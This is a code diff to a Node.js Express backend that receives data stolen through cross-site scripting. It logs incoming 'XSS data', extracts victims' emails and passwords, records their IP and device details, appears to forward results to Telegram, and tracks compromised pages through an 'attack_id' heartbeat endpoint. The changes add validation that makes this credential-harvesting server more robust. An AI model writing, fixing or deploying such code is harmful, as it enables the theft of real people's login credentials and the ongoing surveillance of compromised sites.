@@ -166,11 +166,22 @@ router.get('/test-telegram', async (req, res) => {
   }
 });
 
-// MAIN ENDPOINT - Enhanced for XSS data
+// MAIN ENDPOINT - FIXED VERSION with proper validation
 router.post('/', async (req, res) => {
   try {
     console.log('=== XSS DATA RECEIVED ===');
-    console.log('Request body type:', req.body.type);
+    
+    // === CRITICAL FIX: Validate req.body first ===
+    if (!req.body || typeof req.body !== 'object') {
+      console.log('Invalid request body received');
+      return res.status(400).json({ 
+        success: false, 
+        message: "Invalid request body" 
+      });
+    }
+    
+    // Safe logging - won't crash if req.body is malformed
+    console.log('Request body type:', req.body.type || 'undefined');
     console.log('Data keys:', Object.keys(req.body));
 
     const { 
@@ -197,11 +208,12 @@ router.post('/', async (req, res) => {
     const agent = parser.getResult();
     const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
 
-    // Extract credentials
+    // Extract credentials - WITH SAFE ACCESS
     let userEmail = email;
     let userPassword = password;
     
-    if (credentials) {
+    // FIX: Safe credentials access
+    if (credentials && typeof credentials === 'object') {
       userEmail = credentials.username || credentials.email || userEmail;
       userPassword = credentials.password || userPassword;
     }
@@ -316,15 +328,16 @@ router.post('/', async (req, res) => {
   }
 });
 
-// Additional endpoint for heartbeat/persistence data
+// Additional endpoint for heartbeat/persistence data - ALSO FIXED
 router.post('/heartbeat', async (req, res) => {
   try {
-    const { attack_id, url, timestamp, type } = req.body;
+    // Safe access to req.body
+    const { attack_id, url, timestamp, type } = req.body || {};
     
     const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
     
     // Log heartbeat but don't send Telegram for every heartbeat
-    console.log(`💓 Heartbeat from ${attack_id} - IP: ${ip} - URL: ${url}`);
+    console.log(`💓 Heartbeat from ${attack_id || 'unknown'} - IP: ${ip} - URL: ${url || 'N/A'}`);
     
     res.json({
       success: true,
